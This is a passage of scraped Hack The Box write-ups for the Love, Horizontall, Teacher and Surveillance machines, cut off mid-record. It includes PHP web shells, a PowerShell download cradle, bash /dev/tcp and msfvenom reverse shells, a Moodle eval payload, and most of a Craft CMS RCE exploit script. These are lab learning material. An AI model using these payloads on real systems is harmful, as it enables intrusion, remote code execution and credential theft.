        "content": "Love is an easy Windows box created by pwnmeow on Hack The Box and was released on the 1st of May 2021. Hello world, welcome to Haxez where today I will explain how I hacked Love. To hack this box is it recommended that you have Windows enumeration and web enumeration skills. From hacking this box, you will learn exploit modification, server-side request forgery, applocker policies, and always install everything misconfiguration.\nLove Enumeration\nAfter spawning the box, I sent a single ping request to ensure it was online. I then followed up with a Nmap scan targeting all ports, requesting service versions, and running default scripts. Finally, I gave it a minimum packet rate of 10000 and said to output all formats. From the results, I learnt that there were several ports open. This included various ports for HTTP, 445 for SMB, 3306 for MySQL, 5985 and 5986 for HTTPAPI or WinRM, the list goes on.\n┌──(kali㉿kali)-[~/HTB/Love]└─$ sudo nmap -sC -sV -p- 10.129.48.103 --min-rate 10000 -oA love\nAs SMB was listening, the first thing I did was run crackmapexec to enumerate shares and host information. From the results, I learnt that it was a Windows 10 Pro box with the hostname LOVE. The domain was also called Love which suggests the box is not a domain controller (as they have the same name). Furthermore, SMBv1 was enabled.\n┌──(kali㉿kali)-[~/HTB/Love]└─$ crackmapexec smb 10.129.48.103\nLove Web Application Enumeration\nAfter poking SMB, I went to take a look at the web application. First, I visited the application in my browser and saw that it was a type of voting application. Next, I appended various extensions to the end of the index page. As a result, I learnt that the application was written in PHP.\nFollowing that, I ran whatweb against the application and learnt that the PHP version was 7.3.27. Furthermore, I also learnt that the Apache version was 2.4.46 and that the application was using the Bootstrap framework.\n┌──(kali㉿kali)-[~/HTB/Love]└─$ sudo whatweb -a3 http://10.129.48.103/ -v\nI also ran a gobuster scan to try to identify any directories or files that would disclose sensitive information about the application. However, other than some 301 and 302 redirections and a bunch of 403 errors, I didn’t find much.\n┌──(kali㉿kali)-[~/HTB/Love]└─$ gobuster dir -u http://10.129.48.103/ -w /media/sf_OneDrive/SecLists/Discovery/Web-Content/raft-small-words-lowercase.txt -x php,txt,bak -o gobuster.love.txt\nMore Love Application Enumeration\nI decided to look at the other HTTP ports that were discovered during the Nmap scan. Therefore, I punched the IP address of the box into my browser and specified port 5000. Immediately, I received a Forbidden error. I shouldn’t have been surprised by this as Nmap displayed the forbidden error in the results.\nSubdomains and Virtual Hosts\nI revisited the results of the Nmap scan to choose which service to poke at next. It was then that I noticed the common name of the SSL certificate on port 443. Below, you can see the output from the Nmap scan showing the subdomain of staging.love.htb.\nImmediately, I excitedly added the IP address and new subdomain to my host file. Surely this was the foothold that I’d been looking for. Finally, I found a weakness in this box’s armour! I entered the domain into my browser and…. Forbidden. Wow, talk about rejection.\n┌──(kali㉿kali)-[~/HTB/Love]└─$ echo '10.129.48.103 staging.love.htb' | sudo tee -a /etc/hosts\nHowever, visiting the subdomain via HTTP instead of HTTPS loaded a page. I poked around the application for a bit and noticed a demo page. In short, the demo page is a free file scanner that allows the user to submit a URL with a file for scanning.\nServer-Side Request Forgery\nI wanted to see if the demo page worked so I set up a netcat listener on my local machine. Next, I input the location of a file into the Scan File input box and sent the request. Sure enough, the application pulled the file down from my host and displayed the contents. Admittedly, my first thought was to try and get it to execute a payload by downloading it from my host. However, those attempts failed.\nThere is a Web Application vulnerability known as Server Side Request Forgery. In short, SSRF exploits the box’s own trust. Because the resource request is sent from the box itself, it may allow access to otherwise forbidden files. To illustrate, I input the loopback address of 127.0.0.1 followed by port 5000 into the URL box. This was the page I was previously unable to access. Upon sending the request, I received credentials.\nVoting System Admin\nWith the username and password successfully stolen via SSRF, I headed back to the voting system by navigating to the IP address. Next, I supplied the stolen credentials and… they didn’t work. This is another one of those easy boxes which seems more difficult than it is because it takes so long.\nFortunately, I ran a gobuster earlier and remember seeing a 301 redirection from /admin to /admin/. This is where gobuster attempted to load a file called admin but was redirected to a directory called admin, likely containing a PHP file. Therefore, I headed to the admin directory and was able to log in with the credentials.\nLove RCE POC\nI noticed the Copyright disclaimer at the bottom of the page and decided to perform a Google search for the name SourceCodeStar. After a few Google searches, I stumbled upon several Exploit Database pages which suggested there was an authenticated remote code execution. Unfortunately, there didn’t appear to be a CVE number associated with it.\nAdmittedly, I wanted some guidance on this step so I am going to copy what IppSec did >>HERE<<. First, I navigated to the Voters menu option and clicked the New button. This spawned the window you see below. I populated the window with some test data and selected a jpeg file for the photo.\nNext, I turned intercept on and clicked the save button. Burp successfully intercepted the request which I then modified. I changed the filename to “haxez.php” and then removed the jpeg data and replaced it with a PHP web shell.\n------WebKitFormBoundaryM93O7d6XpEp6S0dPContent-Disposition: form-data; name=\"photo\"; filename=\"haxez.php\"Content-Type: image/jpeg<?php system($_REQUEST[\"cmd\"]); ?>\nThen, I navigated to the payload in my browser and passed the dir command to the cmd parameter. It successfully listed out the contents of the directory.\nLove Foothold\nNow that I had command execution, it was time to get on the box using a reverse shell. I downloaded nishang from >>HERE<< and copied the Invoke-PowerShellTcpOneLine.ps1 payload to my current working directory. Next, I opened the payload with VIM and changed the IP address and port to my tun0 IP address and port 9001.\nThen, I sent my original directory listing request to Burp repeater and changed the request method to a POST. Next, I started a netcat listener and then added the following Payload to Burp and sent the request. I instantly received a 404 error. There must be a clean-up script on the box that is removing the payloads.\ncmd=powershell \"IEX(New-Object Net.WebClient).downloadString('http://10.10.14.36/hax.ps1')\"\nI quickly repeated the process by uploading a new command shell and executing the above payload. Finally, I got a reverse shell and had a foothold on the box. From here, I was able to grab the user flag from the phoebe users desktop directory.\n┌──(kali㉿kali)-[~/HTB/Love]└─$ sudo nc -lvnp 9001                                             [sudo] password for kali: listening on [any] 9001 ...connect to [10.10.14.36] from (UNKNOWN) [10.129.48.103] 59730PS C:\\xampp\\htdocs\\omrs\\images> whoamilove\\phoebePS C:\\xampp\\htdocs\\omrs\\images> type C:\\Users\\phoebe\\Desktop\\user.txtd85▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓319\nLove Privilege Escalation\nAfter capturing the user flag, I download the latest version of the 64 bit obfuscated WinPEASS binary. Next, I spawn a Python3 web server and used cURL to download the binary to the target machine. Finally, I ran the executable and saw that the AlwaysInstallElevated value was set to 1 which I presume means it was enabled. Quoting directly from the HackTricks article “If these 2 registers are enabled (value is 0x1), then users of any privilege can install (execute) *.msi files as NT AUTHORITY\\SYSTEM.”. Is this a useful setting to have as a sysadmin? it seems a bit odd.\nWith this knowledge, I went back to my Linux terminal and used msfvenom to create an MSI payload. The output below will create a Windows x64 reverse shell that connects back to my local host on port 9002. The file type is specified as an MSI file and I saved the output to payload.msi.\n┌──(kali㉿kali)-[~/HTB/Love]└─$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.36 LPORT=9002 -f msi > payload.msi\nI set up a netcat listener to listen on port 9002 and then used cURL to download the payload from the Python web server I still had running. I specified the -o flag to save the payload as payload.msi.\nPS C:\\users\\public\\documents> curl http://10.10.14.36/payload.msi -o payload.msiPS C:\\users\\public\\documents> .\\payload.msi\nFinally, I ran the payload and thankfully, I received a connection back to the netcat listener. I now had a reverse shell as the nt authority\\system user and could finally capture the root flag.\n──(kali㉿kali)-[~/HTB/Love]└─$ sudo nc -lvnp 9002                                           [sudo] password for kali: listening on [any] 9002 ...connect to [10.10.14.36] from (UNKNOWN) [10.129.48.103] 59734Microsoft Windows [Version 10.0.19042.867](c) 2020 Microsoft Corporation. All rights reserved.C:\\WINDOWS\\system32>type \\users\\administrator\\desktop\\root.txttype \\users\\administrator\\desktop\\root.txt64b▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓95f\nLove Learnings\nLove requires patience… the initial enumeration stage of this box took longer than I had hoped. It felt like I was jumping through hoops but it taught me valuable lessons about enumeration. It’s one of those boxes that seemed difficult due to the level of enumeration required to get a foothold, but the actual exploit is easy. Furthermore, it does a great job of demonstrating Server Side Request Forgery which I hadn’t really done before.\nThe privilege escalation was a lot of fun and fairly simple to pull off. I didn’t know about this method of privilege escalation until today so I’ve learnt that too. Overall it’s a fun box but it definitely tested my patience at times. My initial PHP shell just up and vanished so I had to upload that again before getting my reverse shell. For me, it was educational and taught me new techniques which is what I want from an easy box. Thanks for the box."
    },
    {
        "title": "Hack The Box Horizontall Writeup",
        "link": "https://medium.com/@joemcfarland/hack-the-box-horizontall-writeup-4f10ec21a949",
        "content": "Horizontall is an easy Linux box created by wall99 on Hack The Box and was released on the 28th Aug 2021. Hello world, welcome to haxez where today I will be going through how I hacked Horizontall. To complete this box it is suggested that you have basic Web Enumeration, Linux Enumeration, and SSH Knowledge. The lessons from this box are Source Code Review and Port Forwarding.\nHorizontall Enumeration\nTo ensure that the box was online and that I could talk to it, I sent a ping request. Since the box responded, I performed a Nmap scan against all ports, with default scripts and requested service versions. As a result, I learnt that ports 22 for SSH and 80 for HTTP were open.\nHorizontall Application Enumeration\nNavigating to the IP address in my browser, I was redirected to the domain horizontall.htb. However, as this domain name doesn’t resolve through DNS I received an error from Burp.\nTo fix this, I echoed the box’s IP address and domain name into my host’s file. As a result, when visiting the domain name the application loaded as expected. The web application appeared to be a commercial website for a website development company. However, the website wasn’t functional as the links and the contact us form didn’t work.\n┌──(kali㉿kali)-[~]└─$ echo \"10.129.234.11 horizontall.htb\" | sudo tee -a /etc/hosts\nNext, I ran whatweb but it didn’t reveal much about the application that Nmap hadn’t already told me. It told me the server was Ubuntu and that the web server was nginx.\n┌──(kali㉿kali)-[~]└─$ whatweb http://horizontall.htb/\nI ran 2 gobuster scans, 1 to look for directories and 1 to look for virtual hosts but unfortunately, neither produced anything interesting. I think I’m running gobuster incorrectly for virtual hosts. I believe there is an –append-word argument that needs to be added but I get an error when doing that. I will have to look into that this evening.\n┌──(kali㉿kali)-[~]└─$ gobuster vhost -w /media/sf_OneDrive/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -u http://horizontall.htb -o vhostgobuster.txt -t 50\nHowever, ffuf does find the virtual host. I filtered by a file size of 194 because that was the file size of the generic error response. I’m doing something wrong with gobuster. Since I wouldn’t have found the virtual host, I’m going to ignore these results and continue enumerating. I’m going to search the academy for gobuster this evening.\n┌──(kali㉿kali)-[~]└─$ sudo ffuf -u http://horizontall.htb/ -H \"Host: FUZZ.horizontall.htb\" -w /media/sf_OneDrive/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -fs 194\nReturn To The Source\nIt’s where one must go when they’ve run out of ideas. As you can see below, there were references to Cascading Style Sheet files and Javascript files. I decided to take a look at the Javascript files to see if they contained anything interesting.\nHowever, the way the browser rendered the code was horrible so I went to https://beautifier.io/ and pasted in the Javascript. Skimming through the code, I noticed a function called getReviews which pointed to the subdomain api-prod.\nAPI Virtual Host Enumeration\nAfter adding the new virtual host to my host file, I navigated to it in my browser. There wasn’t much to look at other than a welcome message.\nI’m pleased to say that gobuster worked for directory brute forcing. It seems there were 3 subdirectories.\n┌──(kali㉿kali)-[~]└─$ gobuster dir -u http://api-prod.horizontall.htb/ -w /media/sf_OneDrive/SecLists/Discovery/Web-Content/raft-small-words-lowercase.txt\nI navigated to the admin directory which rendered a login page. The page revealed that the technology in use was strapi. Next, I visited the reviews page which returned a JSON response from the server showing reviews of the product.\nFollowing the discovery of the technology, I searched for exploits on Exploit Database and found an RCE. In short, the exploit performs a password reset. It’s written in Python and exploits the vulnerability with the CVE designation CVE-2019-18818. The CVE description explains the following.\nstrapi before 3.0.0-beta.17.5 mishandles password resets within packages/strapi-admin/controllers/Auth.js and packages/strapi-plugin-users-permissions/controllers/Auth.js.\nTherefore, I navigated to the /admin/init endpoint to retrieve the service version to determine whether it was vulnerable. The API reported back that it was version 3.0.0-beta.17.4 which suggested it should be.\nHorizontall Foothold\nDon’t you just love it when an exploit just works without having to tinker with it? I copied the code and recreated it locally in a file called exploit.py. Next, I used Python3 to run the code and fed it the URL of the application. Almost immediately, the exploit told me that the password was reset successfully.\n┌──(kali㉿kali)-[~/HTB/Horizontall]└─$ python3 exploit.py http://api-prod.horizontall.htb/\nJust like that, I had code execution and could send myself a reverse shell. First, I set up a netcat listener on my attack box. Next, I ran the following command in the shell on the target machine. Finally, I landed on the box as the strapi user and was able to grab the user flag.\nbash -c 'bash -i >& /dev/tcp/10.10.14.36/9001 0>&1'┌──(kali㉿kali)-[~]└─$ sudo nc -lvnp 9001[sudo] password for kali: listening on [any] 9001 ...connect to [10.10.14.36] from (UNKNOWN) [10.129.234.11] 46802strapi@horizontall:~/myapi$ ls /homels /homedeveloperstrapi@horizontall:~/myapi$ cat /home/developer/user.txtcat /home/developer/user.txt6e7▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓dc0strapi@horizontall:~/myapi$\nHorizontall Authenticated Enumeration\nFirst, I wanted to establish persistence on the host so I created a .ssh directory in /opt/strapi/.ssh. Next, I created an SSH key using ssh-keygen and echoed the public key into the authorized_keys file. Finally, I gave the SSH private key 600 permissions and used it to SSH to the host. Once I was back on the host I enumerated the listening services and discovered that port 8000 and MySQL were listening locally.\nFirst, I decided to try and get access to MySQL. Starting at the /opt/strapi/ directory, I ran a recursive grep for the word password but was bombarded with noise. After jumping around a few directories I finally found the database password.\nstrapi@horizontall:~/myapi/config$ grep -R passwordenvironments/production/database.json:        \"password\": \"${process.env.DATABASE_PASSWORD || ''}\",environments/development/database.json:        \"password\": \"#J!:F9Zt2u\"environments/staging/database.json:        \"password\": \"${process.env.DATABASE_PASSWORD || ''}\",\nAs a result, I was able to log in to the MySQL database as the development user but this appeared to be a dead end. I queried the database and dumped the contents of the various user tables but couldn’t find any hashes other than the administrators.\nSince MySQL was a dead end, I moved on to see what was listening on port 8000. Using SSH, I performed local port forwarding so that I could access port 8000 via localhost:1234. Upon visiting that port I found a Laravel application.\n┌──(kali㉿kali)-[~/HTB/Horizontall]└─$ ssh -L 1234:localhost:8000 -i key strapi@10.129.234.11\nI ran gobuster to discover directories and was able to identify the /profiles directory. However, the box crapped out shortly after and killed my tunnel.\n┌──(kali㉿kali)-[~]└─$ gobuster dir -u http://localhost:1234/ -w /media/sf_OneDrive/SecLists/Discovery/Web-Content/raft-small-words.txt\nI recreated the tunnel and navigated to the profiles directory. The application appeared broken and had visual debugging enabled. Searching Google for Laravel Debug exploits resulted in finding this payload >>HERE<<which I recreated locally.\nHorizontall Privilege Escalation\nI ran the exploit using the syntax below and the results indicated that Laravel was running as root. I was almost there, all I needed to do now was craft a reverse shell and send it back to myself.\n┌──(kali㉿kali)-[~/HTB/Horizontall/laravel]└─$ python3 exploit.py http://localhost:1234 Monolog/RCE1 id\nI was close to getting it right the first time. You can see from the screenshot below the different payloads I tried before resuming IppSec’s video. I attempted the first two on my own before resuming the video but as soon as he said curl, I paused it again and executed the payload myself. Little victories.\nI created a shell script which contained the following bash script. I then used the exploit with curl to download the file which I then piped to bash to execute it.\n┌──(kali㉿kali)-[~/HTB/Horizontall]└─$ cat shell.sh      #!/bin/bashbash -i >& /dev/tcp/10.10.14.36/9002 0>&1\nBelow, you can see the exact command I used. It needed to be enclosed in single quotation marks. If medium will let me include it that is.\nThis connected back to my netcat listener and allowed me to capture the root flag.\n┌──(kali㉿kali)-[~]└─$ nc -lvnp 9002listening on [any] 9002 ...connect to [10.10.14.36] from (UNKNOWN) [10.129.234.11] 42330bash: cannot set terminal process group (65829): Inappropriate ioctl for devicebash: no job control in this shellroot@horizontall:/home/developer/myproject/public# cat /root/root.txtcat /root/root.txt19c▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓8f4root@horizontall:/home/developer/myproject/public#\nHorizontal Learnings\nThere was certainly a lot to learn from this one. I’m starting to understand the difference between difficult and time-consuming boxes. The time it takes to own a box doesn’t necessarily equate to the difficulty. This box took me a long time to complete but it wasn’t that difficult. Owning this box required exploiting publically known vulnerabilities with available exploits. In my opinion, that is exactly what an easy box should be. It did require a lot of enumeration and knowing what to look for.\nI enjoyed this box a lot, it let me practise techniques I’m familiar with. It introduced me to technologies I hadn’t used before and their vulnerabilities. Furthermore, it also highlighted areas where I need to invest time to improve. Admittedly, I was worried that the different exploits weren’t going to work but I was pleasantly surprised. Overall, this was a great box which I’m probably going to revisit to get a better understanding."
    },
    {
        "title": "Hack The Box Teacher Writeup",
        "link": "https://medium.com/@joemcfarland/hack-the-box-teacher-writeup-31979f830ba1",
        "content": "Teacher is an easy Linux box created by mrh4sh on Hack The Box. The official walkthrough states that it’s a medium box. However, it is categorized as an easy box in the machines section. It is recommended that you have basic Linux and MySQL knowledge to complete this box. By completing this box you will learn Website Enumeration, Password Brute-Forcing, Moodle Quiz Module Exploitation, Database Enumeration, Password Cracking, and Linux Symlink Misconfiguration. Hello world, welcome to Haxez where today I will be explaining how I hacked Teacher.\nTeacher Enumeration\nFirst, I spawned the box and connected my attack box to the Hack The Box VPN. Once connected, I sent a ping request to the box to ensure it was online. Then I performed a Nmap scan to check what ports were open. Furthermore, I requested the service versions, asked for default scripts to be run, and that the minimum packet rate was 10000. Finally, I saved the output in all formats to files called teacher. From the results, I learned that only port 80 for HTTP was open and that it was running Apache 2.4.25.\nsudo nmap -sC -sV -p- 10.129.202.224 --min-rate 10000 -oA teacher\nTeacher Web Application Enumeration\nSince port 80 was the only open port, I headed over to the application. There wasn’t a great deal of functionality offered by the application. It seemed fairly generic with few pages that I could interact with. For an application that calls itself Blackhat Highschool, it seemed a bit too clean. I was hoping for something dark and edgy.\nMoving on, I ran whatweb against the application which told me it was an HTML 5 application with JQuery 1.11.1. Next, I navigated to index pages with various different extensions (index.html, index.php). Sure enough, the one that loaded the main page was index.html.\nAs I didn’t have much to go on, I decided to run gobuster to look for hidden content. Perhaps there was a hidden directory or a secret file telling me that the princess is in another castle. I told gobuster to perform a directory attack using the raft-small-words.txt wordlist in SecLists. Furthermore, I also asked it to try various different extensions and set the thread count to 50.\nAs a result, I learned that there was a directory called Moodle. Their GitHub page explains that Moodle is a free and open-source learning management system written in PHP and distributed under the GNU General Public License. Moodle is used for blended learning, distance education flipped classrooms, and other online learning projects in schools, universities, workplaces, and other sectors. I headed to the Moodle directory but received an error because it redirected to teacher.htb. Therefore, I added the IP address and teacher.htb domain to my /etc/hosts file and revisited the directory. Abracadabra, the site started loading.\nPicture In Picture\nI honestly don’t know what to say about this part of the box. I know I wouldn’t have found it if it wasn’t for a walkthrough. It’s not something I regularly check. I found Moodle but had no way to log in. However, directory listing on the images directory was enabled. Visiting each of the images loaded an image as expected, except for 5.png.\nI downloaded the picture locally and used less to review the contents of the file. It wasn’t an image at all. It appeared to be a helpdesk ticket. I can’t fathom how a helpdesk ticket would have ended up on the website. For my own sanity, I’m going to pretend that the helpdesk agent and web developer are the same person. Furthermore, I’m also going to pretend that they accidentally renamed the wrong file and uploaded it. The ticket gave me the username Giovanni and a partial password of Th4C00lTeacha.\nMoodle Bruteforce\nI launched Burp and headed back to the Moodle login page. Next, I populated the login form with the credentials provided in the support ticket. Then, I clicked submit and located the login request in Burp’s HTTP history. I sent the request to the intruder tool and added a character to the end of the password. Then, I highlighted that character and added the payload characters.\nNext, I navigated to the payload tab but because I’m using Burp community edition, I had to create my own payloads. As a result, I combined several wordlists from the SecLists fuzzing directory so that they contained numbers 0 to 9, all alphabetical characters (lower and uppercase), and all special characters.\nI then click the start attack button and watched as Burp went through each payload, appending it to the end of the password. There are other tools that I could have used to do this such as WFUZZ or FFUF but I know how to use Burp so I thought it was the best option. An indication that a specific payload has had a different result is the length of the response produced by the application. The screenshot below shows that most of the responses were 868 characters. However, the payload with the # symbol produced a response with 993 characters.\nEvil Teacher Vulnerability\nI wasn’t sure what the Moodle version was. I ran what web again against the teacher.htb domain Moodle directory but got nothing. As a result, I looked on Google and found that the Moodle version can be found from the Moodle Docs for this page link at the bottom of a course page. This told me that it was Moodle version 3.4.\nThere is a vulnerability in Moodle 3.4 with the CVE designation CVE-2018–1133. The vulnerability is also known as Evil Teacher. It could allow a user with the teacher role to perform code execution by creating a quiz. SonarSource has an excellent writeup on it so I’m not going to attempt to explain it in too much detail. Essentially, formulas are passed to an eval function which allows for code execution. So if a threat actor can create a quiz with a malicious formula in one of the questions, they may be able to execute code.\nTeacher Foothold\nI navigated to the algebra page and enabled editing. Next, I used the add an activity or resource option to add a quiz to the Topic 1 section.\nI gave the quiz a name and description and clicked next.\nAfter that, I clicked the little blue add link on the next page and chose to add a question. Then, I selected the calculated question type as that would be likely to have the option to add a formula. Finally, I pasted the working exploit into the formula and changed the grad value to 100%.\n/*{a*/`$_GET[0]`;//{x}}\nIt was time for the moment of truth. I captured the request with Burp and sent it to the repeater tool. Next, I appended the URL with a payload that would ping my box. I started tcpdump to listen out for ICMP packets that hit my tun0 adaptor and clicked send.\nGET /moodle/question/question.php?returnurl=%2Fquestion%2Fedit.php%3Fcmid%3D7&appendqnumstring&scrollpos=0&id=6&wizardnow=datasetitems&cmid=7&0=/bin/ping+10.10.14.34 HTTP/1.1\nsudo tcpdump -i tun0 -n icmp\nTo my surprise, it worked the first time. I started receiving ping packets from the target box.\nNow that I had code execution, I modified my payload to a reverse shell, started netcat, and was able to pop a reverse shell.\nGET /moodle/question/question.php?returnurl=%2Fmod%2Fquiz%2Fedit.php%3Fcmid%3D8%26addonpage%3D0&appendqnumstring=addquestion&scrollpos=0&id=6&wizardnow=datasetitems&cmid=8&0=bash+-c+'bash+-i+>%26+/dev/tcp/10.10.14.34/9001+0>%261' HTTP/1.1\nTeacher System Enumeration\nI couldn’t find the user flag once logged in so I checked the home directory and that there was a user called giovanna. That’s probably where the user.txt file is. I could try switching to that user with the password we logged in to Moodle with. However, I decided to take a look at the database first. I pulled the username and password from the /var/www/html/moodle/config.php file. After logging in, I was able to grab usernames and password hashes from the mdl_users table.\nselect id,username,password from mdl_user;\nI copied the Giovannibak hash to a file on my attack box and used John to crack it with the rockyou wordlist.\nI was then able to switch to the giovanni user and capture the user.txt flag.\nwww-data@teacher:/var/www/html/moodle$ su giovannisu giovanniPassword: expelledgiovanni@teacher:/var/www/html/moodle$ cd ~/cd ~/giovanni@teacher:~$ lslsuser.txt  workgiovanni@teacher:~$ cat user.txtcat user.txt881▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓823\nTeacher Privilege Escalation\nThe box keeps crashing meaning I have to do the above process all over again. As a result, the following explanation is going to be brief because I simply can’t be bothered with this box anymore. Looking at the time stamps on the user’s home directory I could see that something was changing fairly frequently. I set up a Python webserver and download pspy onto the box. Running pspy I noticed that a backup script was running.\nThe backup script was changing to the /home/giovanni/work directory and then backing up the courses directory. It was then changing the directory to /home/giovanni/work/tmp and changing the permissions to 777.\ngiovanni@teacher:/var/www/html/moodle/question$ cat /usr/bin/backup.sh#!/bin/bashcd /home/giovanni/work;tar -czvf tmp/backup_courses.tar.gz courses/*;cd tmp;tar -xf backup_courses.tar.gz;chmod 777 * -R;\nYou may have to forgive me here as I’ve reached the end of my tether. I had to restart the box about 5 times due to it crashing repeatedly. All I did was create a symbolic link from courses to /root. That way, when the script runs, the contents of the root directory will be backed up to work/tmp/courses which will allow me to capture the root flag.\ngiovanni@teacher:~/work$ ln -s /root coursesgiovanni@teacher:~/work$ ls -laSh coursesgiovanni@teacher:~/work$ lscourses  courses.bak  tmpgiovanni@teacher:~/work$ cd tmpgiovanni@teacher:~/work/tmp$ lsbackup_courses.tar.gz  coursesgiovanni@teacher:~/work/tmp$ cd coursesgiovanni@teacher:~/work/tmp/courses$ lsalgebra  root.txtgiovanni@teacher:~/work/tmp/courses$ cat root.txtcat root.txt63d▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓3cc\nTeacher Learnings\nIronically, I didn’t learn a lot from the teacher box. The Moodle exploit was interesting as I hadn’t done it before but that was about it. Unfortunately, I have to say that this is one of my least favorite boxes that I’ve completed so far. The concept is nice but the box was too flakey, well for me it was anyway. It seemed that the slightest mistake in syntax caused the box to throw a tantrum. This is on a private VIP box too so not like other people were hitting it.\nI think enabling SSH would have made the box more tolerable as it would have allowed quick access to the user. I wouldn’t want this on every box but having to repeat the Moodle exploit every time the box decided to stop responding made me want to quit. Also what was up with the credentials hidden in the image… Oh well, it’s done now and I can put it behind me. Glad I did it but didn’t enjoy it. Thanks for the box!"
    },
    {
        "title": "Hack The Box (Surveillance) | by Software Sinner - Medium",
        "link": "https://software-sinner.medium.com/hack-the-box-surveillance-5a0c8f716e53",
        "content": "I’ve been on the Hack The Box platform for many years now and It sharpens my hacking skills. This machine was one of my favorites to hack. It was a Medium level machine and I am proud of myself for owning it. The machine goes over a heavy enumeration that leads to exploiting Craft CMSto get a low-level shell on the server. Privilege escalation was performed by doing a local port-forward with ssh exploiting ZoneMinder.\nThey are always watching you…\nEnumeration:\nI blastedautoreconat the IP and got back only two ports which was sweet. I served up all of my scan results from autorecon to my Python local HTTP server. This helps me stay organized when viewing my results in a web browser.\nsudo $(which autorecon) <Target IP Here>\nIn another terminal window while autorecon is running:\npython -m http.server 80\nNmap Results:\nNmap scan report for 10.10.11.245Host is up, received user-set (0.076s latency).Scanned at 2024-02-13 15:51:45 PST for 72sNot shown: 65533 closed tcp ports (reset)PORT   STATE SERVICE REASON         VERSION22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: |   256 96:07:1c:c6:77:3e:07:a0:cc:6f:24:19:74:4d:57:0b (ECDSA)| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBN+/g3FqMmVlkT3XCSMH/JtvGJDW3+PBxqJ+pURQey6GMjs7abbrEOCcVugczanWj1WNU5jsaYzlkCEZHlsHLvk=|   256 0b:a4:c0:cf:e2:3b:95:ae:f6:f5:df:7d:0c:88:d6:ce (ED25519)|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIm6HJTYy2teiiP6uZoSCHhsWHN+z3SVL/21fy6cZWZi80/tcp open  http    syn-ack ttl 63 nginx 1.18.0 (Ubuntu)|_http-title: Did not follow redirect to http://surveillance.htb/|_http-server-header: nginx/1.18.0 (Ubuntu)| http-methods: |_  Supported Methods: GET HEAD POST OPTIONS\nVisiting the IP in Firefox It was trying to communicate with the domain surveillance.htb. I mapped the domain to the machine's IP in the/etc/hosts file.\nsudo nano /etc/hosts\nRevisiting the IP back in my browser resolved it to the domain and was able to access the page.\nThe company offers Cameras, Intrusion, Perimeter Security, Access Control & Intercom services.\nThe first thing I always do when navigating a web page is analyze it by hitting ctrl-u on my keyboard for the“View Page Source” functionality in Firefox. I had the wappalyzerextension installed also so this gave me some info on what technologies the server was using.\nI did a keyword search in the view page source ctrl-f for “CMS” and came across some version information.\nExploitation:\nDoing some googling of the version I found an exploit on Github that this person spoiled for us since it's related to this machine.\nThanks anyway dude 😏.\n#!/usr/bin/env python3#coding: utf-8# Exploit Title: Craft CMS unauthenticated Remote Code Execution (RCE)# Date: 2023-12-26# Version: 4.0.0-RC1 - 4.4.14# Vendor Homepage: https://craftcms.com/# Software Link: https://github.com/craftcms/cms/releases/tag/4.4.14# Tested on: Ubuntu 22.04.3 LTS# Tested on: Craft CMS 4.4.14# Exploit Author: Olivier Lasne# CVE : CVE-2023-41892# References :# https://github.com/craftcms/cms/security/advisories/GHSA-4w8r-3xrw-v25g# https://blog.calif.io/p/craftcms-rceimport requestsimport sys, reif(len(sys.argv) < 2):    print(f\"\\033[1;96mUsage:\\033[0m python {sys.argv[0]} \\033[1;96m<url>\\033[0m\")    exit()HOST = sys.argv[1]if not re.match('^https?://.*', HOST):    print(\"\\033[1;31m[-]\\033[0m URL should start with http or https\")    exit()print(\"\\033[1;96m[+]\\033[0m Executing phpinfo to extract some config infos\")## Execute phpinfo() and extract config info from the websiteurl = HOST + '/index.php'content_type = {'Content-Type': 'application/x-www-form-urlencoded'}data = r'action=conditions/render&test[userCondition]=craft\\elements\\conditions\\users\\UserCondition&config={\"name\":\"test[userCondition]\",\"as xyz\":{\"class\":\"\\\\GuzzleHttp\\\\Psr7\\\\FnStream\",\"__construct()\":[{\"close\":null}],\"_fn_close\":\"phpinfo\"}}'try:    r = requests.post(url, headers=content_type, data=data)except:    print(f\"\\033[1;31m[-]\\033[0m Could not connect to {HOST}\")    exit()# If we succeed, we should have default phpinfo credits if not 'PHP Group' in r.text: print(f'\\033[1;31m[-]\\033[0m {HOST} is not exploitable.') exit()# Extract config value for tmp_dir and document_rootpattern1 = r'<tr><td class=\"e\">upload_tmp_dir<\\/td><td class=\"v\">(.*?)<\\/td><td class=\"v\">(.*?)<\\/td><\\/tr>'pattern2 = r'<tr><td class=\"e\">\\$_SERVER\\[\\'DOCUMENT_ROOT\\'\\]<\\/td><td class=\"v\">([^<]+)<\\/td><\\/tr>'tmp_dir       = re.search(pattern1, r.text, re.DOTALL).group(1)document_root = re.search(pattern2, r.text, re.DOTALL).group(1)if 'no value' in tmp_dir: tmp_dir = '/tmp'print(f'temporary directory: {tmp_dir}')print(f'web server root: {document_root}')## Create shell.php in tmp_dirdata = {    \"action\": \"conditions/render\",    \"configObject[class]\": \"craft\\elements\\conditions\\ElementCondition\",    \"config\": '{\"name\":\"configObject\",\"as \":{\"class\":\"Imagick\", \"__construct()\":{\"files\":\"msl:/etc/passwd\"}}}'}files = {    \"image1\": (\"pwn1.msl\", \"\"\"<?xml version=\"1.0\" encoding=\"UTF-8\"?>    <image>    <read filename=\"caption:<?php @system(@$_REQUEST['cmd']); ?>\"/>    <write filename=\"info:DOCUMENTROOT/shell.php\"/>    </image>\"\"\".replace(\"DOCUMENTROOT\", document_root), \"text/plain\")}print(f'\\033[1;96m[+]\\033[0m create shell.php in {tmp_dir}')r = requests.post(url, data=data, files=files) #, proxies={'http' : 'http://127.0.0.1:8080'}) #  # Use the Imagick trick to move the webshell in 